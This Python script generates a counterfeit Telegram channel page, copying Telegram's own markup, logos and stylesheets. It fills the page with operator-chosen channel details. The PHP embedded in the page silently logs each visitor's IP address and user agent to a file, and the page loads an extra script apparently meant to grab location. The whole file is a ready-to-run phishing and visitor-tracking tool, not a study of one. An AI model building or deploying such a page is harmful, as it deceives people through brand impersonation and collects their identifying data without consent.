import datetime
import shutil
import sys
import random

class COLORS:
    cyan = '\033[96m'
    red = '\033[91m'
    white = '\033[0;97m'
    gray = '\033[90m'

def now():
    now = datetime.datetime.now().strftime("%H:%M:%S")
    return now

s2index = """<?php
function getip()
{
    $ip = null;
    if(isset($_SERVER))
    {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        elseif(isset($_SERVER['HTTP_CLIENT_IP']))
        {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
        else
        {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    }
    else
    {
        if(getenv('HTTP_X_FORWARDED_FOR'))
        {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        }
        elseif(getenv('HTTP_CLIENT_IP'))
        {
            $ip = getenv('HTTP_CLIENT_IP');
        }
        else
        {
            $ip = getenv('REMOTE_ADDR');
        }
    }
    return $ip;
}
function getagent()
{ 
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    return $useragent;
}
$ip = getip();
$agent = getagent();
$out = array(
    'status' => 'ip_info',
    'ip' => $ip,
    'agent' => $agent
);
$jsondata = json_encode($out);
file_put_contents("files/info/out.txt", $jsondata);
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Telegram: Contact @$CID$</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
    <script>window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches&&document.documentElement&&document.documentElement.classList&&document.documentElement.classList.add('theme_dark');</script>
    <link rel="icon" type="image/svg+xml" href="https://telegram.org/img/website_icon.svg?4">
    <link rel="apple-touch-icon" sizes="180x180" href="https://telegram.org/img/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://telegram.org/img/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://telegram.org/img/favicon-16x16.png">
    <link rel="alternate icon" href="https://telegram.org/img/favicon.ico" type="image/x-icon" />
    <link href="https://telegram.org/css/font-roboto.css?1" rel="stylesheet" type="text/css">
    <link href="https://telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
    <link href="https://telegram.org/css/telegram.css?232" rel="stylesheet" media="screen">
  </head>
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="/files/js/loc.js"></script>
  <body class="no_transition">
      <div class="tgme_background_wrap">
    <canvas id="tgme_background" class="tgme_background default" width="50" height="50" data-colors="dbddbb,6ba587,d5d88d,88b884"></canvas>
    <div class="tgme_background_pattern default"></div>
  </div>
    <div class="tgme_page_wrap">
      <div class="tgme_head_wrap">
        <div class="tgme_head">
          <a href="https://telegram.org/" class="tgme_head_brand">
            <svg class="tgme_logo" height="34" viewBox="0 0 133 34" width="133" xmlns="http://www.w3.org/2000/svg">
              <g fill="none" fill-rule="evenodd">
                <circle cx="17" cy="17" fill="var(--accent-btn-color)" r="17"/><path d="m7.06510669 16.9258959c5.22739451-2.1065178 8.71314291-3.4952633 10.45724521-4.1662364 4.9797665-1.9157646 6.0145193-2.2485535 6.6889567-2.2595423.1483363-.0024169.480005.0315855.6948461.192827.1814076.1361492.23132.3200675.2552048.4491519.0238847.1290844.0536269.4231419.0299841.65291-.2698553 2.6225356-1.4375148 8.986738-2.0315537 11.9240228-.2513602 1.2428753-.7499132 1.5088847-1.2290685 1.5496672-1.0413153.0886298-1.8284257-.4857912-2.8369905-1.0972863-1.5782048-.9568691-2.5327083-1.3984317-4.0646293-2.3321592-1.7703998-1.0790837-.212559-1.583655.7963867-2.5529189.2640459-.2536609 4.7753906-4.3097041 4.755976-4.431706-.0070494-.0442984-.1409018-.481649-.2457499-.5678447-.104848-.0861957-.2595946-.0567202-.3712641-.033278-.1582881.0332286-2.6794907 1.5745492-7.5636077 4.6239616-.715635.4545193-1.3638349.6759763-1.9445998.6643712-.64024672-.0127938-1.87182452-.334829-2.78737602-.6100966-1.12296117-.3376271-1.53748501-.4966332-1.45976769-1.0700283.04048-.2986597.32581586-.610598.8560076-.935815z" fill="#fff"/><path d="m49.4 24v-12.562h-4.224v-2.266h11.198v2.266h-4.268v12.562zm16.094-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm9.538 6.49v-15.62h2.706v15.62zm14.84-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm19.24-1.144v6.072c0 2.244-.462 3.85-1.584 4.862-1.1.99-2.662 1.298-4.136 1.298-1.364 0-2.816-.308-3.74-.858l.594-2.046c.682.396 1.826.814 3.124.814 1.76 0 3.08-.924 3.08-3.234v-.924h-.044c-.616.946-1.694 1.584-3.124 1.584-2.662 0-4.554-2.2-4.554-5.236 0-3.52 2.288-5.654 4.862-5.654 1.65 0 2.596.792 3.102 1.672h.044l.11-1.43h2.354c-.044.726-.088 1.606-.088 3.08zm-2.706 2.948v-1.738c0-.264-.022-.506-.088-.726-.286-.99-1.056-1.738-2.2-1.738-1.518 0-2.64 1.32-2.64 3.498 0 1.826.924 3.3 2.618 3.3 1.012 0 1.892-.66 2.2-1.65.088-.264.11-.638.11-.946zm5.622 4.686v-7.26c0-1.452-.022-2.508-.088-3.454h2.332l.11 2.024h.066c.528-1.496 1.782-2.266 2.948-2.266.264 0 .418.022.638.066v2.53c-.242-.044-.484-.066-.814-.066-1.276 0-2.178.814-2.42 2.046-.044.242-.066.528-.066.814v5.566zm16.05-6.424v3.85c0 .968.044 1.914.176 2.574h-2.442l-.198-1.188h-.066c-.638.836-1.76 1.43-3.168 1.43-2.156 0-3.366-1.562-3.366-3.19 0-2.684 2.398-4.07 6.358-4.048v-.176c0-.704-.286-1.87-2.178-1.87-1.056 0-2.156.33-2.882.792l-.528-1.76c.792-.484 2.178-.946 3.872-.946 3.432 0 4.422 2.178 4.422 4.532zm-2.64 2.662v-1.474c-1.914-.022-3.74.374-3.74 2.002 0 1.056.682 1.54 1.54 1.54 1.1 0 1.87-.704 2.134-1.474.066-.198.066-.396.066-.594zm5.6 3.762v-7.524c0-1.232-.044-2.266-.088-3.19h2.31l.132 1.584h.066c.506-.836 1.474-1.826 3.3-1.826 1.408 0 2.508.792 2.97 1.98h.044c.374-.594.814-1.034 1.298-1.342.616-.418 1.298-.638 2.2-.638 1.76 0 3.564 1.21 3.564 4.642v6.314h-2.64v-5.918c0-1.782-.616-2.838-1.914-2.838-.924 0-1.606.66-1.892 1.43-.088.242-.132.594-.132.902v6.424h-2.64v-6.204c0-1.496-.594-2.552-1.848-2.552-1.012 0-1.694.792-1.958 1.518-.088.286-.132.594-.132.902v6.336z" fill="var(--tme-logo-color)" fill-rule="nonzero"/>
              </g>
            </svg>
          </a>
          <a class="tgme_head_right_btn" href="https://desktop.telegram.org/">
            Download
          </a>
        </div>
      </div>
      <div class="tgme_body_wrap">
        <div class="tgme_page">
        <div class="tgme_page_photo">
        <a href="tg://resolve?domain=$CID$"><img class="tgme_page_photo_image" src="$CICON$"></a>
        </div>
        <div class="tgme_page_title" dir="auto">
          <span dir="auto">$CNAME$</span>
        </div>
        <div class="tgme_page_extra">$CSUBS$ subscribers</div>
        <div class="tgme_page_description" dir="auto">$CDESC$</a></div>
        <div class="tgme_page_action">
          <a class="tgme_action_button_new shine" href="tg://resolve?domain=$CID$">View in Telegram</a>
        </div>
        <div class="tgme_page_context_link_wrap"><a class="tgme_page_context_link" href="https://t.me/s/$CID$">Preview channel</a></div>
          <div class="tgme_page_additional">
            If you have <strong>Telegram</strong>, you can view and join <br><strong>$CNAME$</strong> right away.
          </div>
        </div>
      </div>
    </div>
    <div id="tgme_frame_cont"></div>
    <script src="https://telegram.org/js/tgwallpaper.min.js?3"></script>
    <script type="text/javascript">
    var tme_bg = document.getElementById('tgme_background');
    if (tme_bg) {
    TWallpaper.init(tme_bg);
    TWallpaper.animate(true);
    window.onfocus = function(){ TWallpaper.update(); };
    }
    document.body.classList.remove('no_transition');

    function toggleTheme(dark) {
    document.documentElement.classList.toggle('theme_dark', dark);
    window.Telegram && Telegram.setWidgetOptions({dark: dark});
    }
    if (window.matchMedia) {
    var darkMedia = window.matchMedia('(prefers-color-scheme: dark)');
    toggleTheme(darkMedia.matches);
    darkMedia.addListener(function(e) {
        toggleTheme(e.matches);
    });
    }
    </script>
  </body>
</html>"""

def s2file(cname,cicon,cid,csubs,cdesc):
    print("")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Generating index.php file.")
    tempindex = s2index
    tempindex = tempindex.replace("$CNAME$", cname)
    tempindex = tempindex.replace("$CDESC$", cdesc)
    tempindex = tempindex.replace("$CSUBS$", csubs)
    tempindex = tempindex.replace("$CICON$", cicon)
    tempindex = tempindex.replace("$CID$", cid)
    with open("site/index.php", "w") as index:
        index.write(tempindex)
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: The index.php is Generated successfully.")

def s2setup():
    cid = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}CHANNEL ID{COLORS.white}]> ")
    cname = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}CHANNEL NAME{COLORS.white}]> ")
    cdesc = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}CHANNEL DESCRIPTION{COLORS.white}]> ")
    csubs = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}CHANNEL SUBSCRIBERS{COLORS.white}]> ")
    cicon_ = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}CHANNEL IMAGE{COLORS.white}]> ").replace("\"","")
    ciconext = cicon_.split('.')[-1]
    iconname= ""
    chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
    for i in range(15):
        iconname += random.choice(chars)
    try:
        shutil.copyfile(cicon_,f"site/files/icons/{iconname}.{ciconext}")
    except:
        sys.exit(f"[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error File Not Found '{cicon_}'{COLORS.white}")
    cicon = iconname+"."+ciconext
    s2file(cname,cicon,cid,csubs,cdesc)